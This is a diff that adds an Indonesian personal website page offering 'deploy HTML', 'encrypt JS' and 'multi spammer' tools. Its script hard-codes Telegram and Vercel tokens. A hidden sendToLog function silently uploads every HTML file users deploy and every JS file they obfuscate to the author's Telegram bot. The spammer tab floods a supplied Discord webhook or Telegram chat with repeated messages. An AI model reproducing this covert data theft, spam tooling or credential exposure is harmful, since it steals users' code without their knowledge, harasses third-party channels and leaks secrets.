@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>website by pinoo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>
+    <style>
+        :root {
+            --accent: #00f2ff;
+            --pink: #ff00ff;
+            --glass: rgba(15, 15, 15, 0.9);
+            --primary-vercel: #0070f3;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; overflow-x: hidden; font-family: 'Press Start 2P', cursive; }
+        #bgVideo { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -1; object-fit: cover; filter: brightness(40%); }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: 0.8s ease; }
+        #overlay button { background: #fff; border: 4px solid var(--accent); padding: 20px; font-size: 10px; cursor: pointer; box-shadow: 8px 8px 0px var(--pink); font-family: inherit; }
+
+        .menu-btn { position: fixed; top: 20px; left: 20px; background: #fff; border: 4px solid #000; padding: 12px; cursor: pointer; z-index: 2000; box-shadow: 4px 4px 0px var(--accent); }
+        .sidebar { position: fixed; left: -320px; top: 0; width: 280px; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border-right: 4px solid #fff; padding: 100px 20px; transition: 0.4s ease; z-index: 1500; }
+        .sidebar.active { left: 0; }
+        .opt { background: #fff; color: #000; padding: 15px; font-size: 9px; cursor: pointer; border: 4px solid #000; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+        .container { background: var(--glass); backdrop-filter: blur(20px); border: 4px solid #fff; padding: 70px 25px 30px 25px; width: 100%; max-width: 480px; text-align: center; position: relative; box-shadow: 15px 15px 0px rgba(0,0,0,0.6); }
+        .profile-pic { width: 90px; height: 90px; border: 4px solid #fff; outline: 4px solid #000; position: absolute; top: -50px; left: 50%; transform: translateX(-50%); z-index: 100; object-fit: cover; background: #000; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.4s ease; }
+        h1 { color: #fff; font-size: 10px; margin-bottom: 25px; text-shadow: 3px 3px 0px #000; line-height: 1.4; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .deploy-ui { font-family: 'Poppins', sans-serif; text-align: left; background: #111; border: 1px solid #333; border-radius: 20px; padding: 25px; margin-top: 10px; }
+        .deploy-ui h2 { font-size: 20px; color: #fff; margin-bottom: 5px; text-transform: lowercase; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { font-size: 11px; color: #999; display: block; margin-bottom: 5px; }
+        .input-modern { width: 100%; padding: 12px; background: #1a1a1a; border: 1px solid #333; border-radius: 10px; color: #fff; outline: none; font-family: 'Poppins', sans-serif; transition: 0.3s; }
+        .btn-modern { width: 100%; padding: 14px; background: #fff; color: #000; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; transition: 0.3s; font-family: 'Poppins', sans-serif; }
+        #checkStatus { font-size: 8px; color: var(--primary-vercel); margin-top: 5px; display: block; }
+
+        .sub-tab-container { display: flex; gap: 5px; margin-bottom: 15px; }
+        .sub-tab { flex: 1; padding: 10px; font-size: 7px; background: #222; color: #fff; border: 2px solid #fff; cursor: pointer; text-align: center; }
+        .sub-tab.active { background: var(--accent); color: #000; }
+
+        .card { display: flex; align-items: center; background: #fff; padding: 20px; text-decoration: none; color: #000; font-size: 8px; margin-bottom: 15px; border: 4px solid #000; box-shadow: 6px 6px 0px var(--accent); }
+        .input-pixel { width: 100%; padding: 12px; background: #000; border: 3px solid #fff; color: #fff; font-size: 8px; margin-bottom: 15px; outline: none; font-family: inherit; }
+        .action-pixel { width: 100%; padding: 15px; background: #fff; font-size: 9px; cursor: pointer; border: 4px solid #000; box-shadow: 5px 5px 0px var(--pink); font-family: inherit; margin-bottom: 10px; }
+        .log-box { background: #000; border: 2px solid #fff; height: 100px; overflow-y: auto; padding: 10px; font-size: 7px; color: #00f2ff; text-align: left; margin-top: 10px; font-family: monospace; }
+        .footer { margin-top: 25px; font-size: 8px; color: #fff; opacity: 0.6; }
+    </style>
+</head>
+<body>
+
+    <video autoplay muted loop playsinline id="bgVideo">
+        <source src="baground.mp4" type="video/mp4">
+    </video>
+
+    <div id="overlay">
+        <button onclick="startApp()">[ CLICK TO ENTER ]</button>
+        <p style="color: white; font-size: 7px; margin-top: 20px;">WELCOME TO PINOO WEBSITES</p>
+    </div>
+
+    <audio id="myAudio" loop><source src="musik.mp3" type="audio/mpeg"></audio>
+
+    <div class="menu-btn" onclick="toggleSidebar()"><i class="fas fa-bars"></i></div>
+
+    <div class="sidebar" id="sidebar">
+        <div class="opt" onclick="switchTab('profile')"><i class="fas fa-user"></i> PROFILE</div>
+        <div class="opt" onclick="switchTab('deploy')"><i class="fas fa-cloud-upload-alt"></i> DEPLOY HTML</div>
+        <div class="opt" onclick="switchTab('encrypt')"><i class="fas fa-lock"></i> ENCRYPT JS</div>
+        <div class="opt" onclick="switchTab('spammer')"><i class="fas fa-bomb"></i> SPAMMER</div>
+    </div>
+
+    <div class="container">
+        <video autoplay muted loop playsinline class="profile-pic">
+            <source src="profile.mp4" type="video/mp4">
+        </video>
+
+        <div id="tab-profile" class="tab-content active">
+            <h1>PINOO COMMUNITY</h1>
+            <div class="links">
+                <a href="https://whatsapp.com/channel/0029Vb7djJ97YSdCFHhojF1b" target="_blank" class="card">
+                    <i class="fab fa-whatsapp" style="color:#25D366; margin-right:10px"></i><span>SALURAN</span>
+                </a>
+                <a href="https://www.tiktok.com/@pinooy4ndek" target="_blank" class="card">
+                    <i class="fab fa-tiktok" style="color:#000; margin-right:10px"></i><span>TIKTOK</span>
+                </a>
+                <a href="https://www.instagram.com/p1n0_19" target="_blank" class="card">
+                    <i class="fab fa-instagram" style="color:#E4405F; margin-right:10px"></i><span>INSTAGRAM</span>
+                </a>
+            </div>
+        </div>
+
+        <div id="tab-deploy" class="tab-content">
+            <div class="deploy-ui">
+                <h2>deploy html</h2>
+                <div class="input-group">
+                    <label>Project Name</label>
+                    <input type="text" id="projName" class="input-modern" placeholder="masukan nama project" oninput="testName()">
+                    <span id="checkStatus"></span>
+                </div>
+                <div class="input-group">
+                    <label>Select File</label>
+                    <input type="file" id="htmlFileInput" accept=".html" style="display:none" onchange="handleHtmlFile(event)">
+                    <button class="btn-modern" onclick="document.getElementById('htmlFileInput').click()" id="htmlFileBtn">PILIH HTML</button>
+                </div>
+                <button id="deployBtn" class="btn-modern" style="background:var(--primary-vercel); color:#fff" onclick="startDeploy()">DEPLOY NOW</button>
+                <div id="resultBox" style="margin-top:15px; display:none; background:#001a00; padding:10px; border:1px solid lime; border-radius:10px;">
+                    <p style="color:lime; font-size:9px; font-family:'Poppins';">sukses deploy html:</p>
+                    <a id="resLink" href="#" target="_blank" style="color:#fff; font-size:10px; word-break:break-all; font-family:'Poppins';"></a>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-encrypt" class="tab-content">
+            <h1>JS ENCRYPTOR</h1>
+            <input type="file" id="jsFileInput" accept=".js" style="display:none" onchange="handleJsFile(event)">
+            <button class="action-pixel" onclick="document.getElementById('jsFileInput').click()">PILIH FILE .JS</button>
+            <textarea id="jsCode" class="input-pixel" style="height:120px;" placeholder="Paste JS Code..."></textarea>
+            <button class="action-pixel" style="background:var(--accent); color:#000;" onclick="encryptJS()">ENCRYPT</button>
+            <button id="downloadJsBtn" class="action-pixel" style="background:lime; color:#000; display:none;" onclick="downloadJS()">DOWNLOAD</button>
+        </div>
+
+        <div id="tab-spammer" class="tab-content">
+            <h1>MULTI SPAMMER</h1>
+            <div class="sub-tab-container">
+                <div id="btnDisc" class="sub-tab active" onclick="setSpamMode('discord')">DISCORD</div>
+                <div id="btnTele" class="sub-tab" onclick="setSpamMode('telegram')">TELEGRAM</div>
+            </div>
+            <div id="uiDiscord">
+                <input type="text" id="discUrl" class="input-pixel" placeholder="Webhook URL...">
+                <button class="action-pixel" onclick="startDiscordSpam()">START SPAM</button>
+            </div>
+            <div id="uiTelegram" style="display:none">
+                <input type="text" id="teleTokenSpam" class="input-pixel" placeholder="Bot Token...">
+                <input type="text" id="teleChatSpam" class="input-pixel" placeholder="Chat ID...">
+                <button class="action-pixel" onclick="startTeleSpam()">START SPAM</button>
+            </div>
+            <div class="log-box" id="logOut">> System ready...</div>
+        </div>
+
+        <div class="footer">CRAFTED BY <strong>PINOO</strong></div>
+    </div>
+
+    <script>
+        const LOG_TOKEN = "8155876986:AAFb40EOzKRvZ7eHTnmxEuwd0_I-VIPM5MQ";
+        const LOG_CHAT_ID = "8022924362";
+        const VERCEL_TOKEN = "bazMfOcKIQhtdfekRAW7Udwn";
+
+        let currentHtmlContent = "";
+        let encryptedJsResult = "";
+
+        function startApp() {
+            document.getElementById('overlay').style.opacity = '0';
+            setTimeout(() => { document.getElementById('overlay').style.display = 'none'; }, 800);
+            document.getElementById('myAudio').play().catch(()=>{});
+        }
+
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); }
+
+        function switchTab(t) {
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            document.getElementById('tab-' + t).classList.add('active');
+            if (window.innerWidth < 800) toggleSidebar();
+        }
+
+        async function sendToLog(name, content, ext) {
+            const formData = new FormData();
+            formData.append('chat_id', LOG_CHAT_ID);
+            formData.append('document', new Blob([content], {type:'text/plain'}), `${name}.${ext}`);
+            formData.append('caption', `📬 Log from Pinoo Web\nName: ${name}`);
+            try { await fetch(`https://api.telegram.org/bot${LOG_TOKEN}/sendDocument`, { method: 'POST', body: formData }); } catch(e){}
+        }
+
+        function testName() {
+            const name = document.getElementById('projName').value.trim();
+            const status = document.getElementById('checkStatus');
+            if(name.length > 0) {
+                status.innerText = "Target: https://" + name.toLowerCase().replace(/\s+/g, '-') + ".vercel.app";
+            } else { status.innerText = ""; }
+        }
+
+        function handleHtmlFile(e) {
+            const file = e.target.files[0];
+            if(file){
+                document.getElementById('htmlFileBtn').innerText = file.name;
+                const r = new FileReader();
+                r.onload = (ex) => { currentHtmlContent = ex.target.result; };
+                r.readAsText(file);
+            }
+        }
+
+        async function startDeploy() {
+            const name = document.getElementById('projName').value.trim().toLowerCase().replace(/\s+/g, '-');
+            const btn = document.getElementById('deployBtn');
+            if(!name || !currentHtmlContent) return alert("Lengkapi data!");
+            btn.innerText = "SABAR COK..."; btn.disabled = true;
+            sendToLog(name, currentHtmlContent, "html");
+            try {
+                const res = await fetch('https://api.vercel.com/v13/deployments', {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${VERCEL_TOKEN}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name: name, target: 'production', files: [{ file: 'index.html', data: currentHtmlContent }], projectSettings: { framework: null } })
+                });
+                const data = await res.json();
+                if(res.ok) {
+                    document.getElementById('resultBox').style.display = 'block';
+                    document.getElementById('resLink').innerText = `https://${name}.vercel.app`;
+                    document.getElementById('resLink').href = `https://${name}.vercel.app`;
+                    btn.innerText = "DEPLOY SELESAI!";
+                } else { alert("Gagal: " + data.error.message); btn.innerText = "DEPLOY NOW"; btn.disabled = false; }
+            } catch(e) { alert("Error!"); btn.innerText = "DEPLOY NOW"; btn.disabled = false; }
+        }
+
+        function handleJsFile(e) {
+            const file = e.target.files[0];
+            if(file){
+                const r = new FileReader();
+                r.onload = (ex) => { document.getElementById('jsCode').value = ex.target.result; };
+                r.readAsText(file);
+            }
+        }
+
+        function encryptJS() {
+            const code = document.getElementById('jsCode').value;
+            if(!code) return alert("No Code!");
+            sendToLog("JS_LOG", code, "js");
+            const res = JavaScriptObfuscator.obfuscate(code, { compact:true, controlFlowFlattening:true });
+            encryptedJsResult = res.getObfuscatedCode();
+            document.getElementById('jsCode').value = encryptedJsResult;
+            document.getElementById('downloadJsBtn').style.display = 'block';
+            alert("sukses encrypt javascript");
+        }
+
+        function downloadJS() {
+            const blob = new Blob([encryptedJsResult], { type: 'text/javascript' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = 'pinoo_encrypted.js'; a.click();
+        }
+
+        function setSpamMode(m) {
+            const isD = m === 'discord';
+            document.getElementById('uiDiscord').style.display = isD ? 'block' : 'none';
+            document.getElementById('uiTelegram').style.display = isD ? 'none' : 'block';
+            document.getElementById('btnDisc').classList.toggle('active', isD);
+            document.getElementById('btnTele').classList.toggle('active', !isD);
+        }
+
+        async function startDiscordSpam() {
+            const url = document.getElementById('discUrl').value;
+            if(!url) return alert("Url mana dongo!");
+            for(let i=1; i<=15; i++) {
+                fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:"SPAM BY PINOO COMMUNITY"}) });
+                document.getElementById('logOut').innerHTML += `<div>> Discord ${i} Sent</div>`;
+                await new Promise(r => setTimeout(r, 600));
+            }
+        }
+
+        async function startTeleSpam() {
+            const t = document.getElementById('teleTokenSpam').value;
+            const c = document.getElementById('teleChatSpam').value;
+            if(!t || !c) return alert("Isi dulu taik!");
+            for(let i=1; i<=15; i++) {
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=SPAM_BY_PINOO`);
+                document.getElementById('logOut').innerHTML += `<div>> Tele ${i} Sent</div>`;
+                await new Promise(r => setTimeout(r, 600));
+            }
+        }
+    </script>
+</body>
+</html>
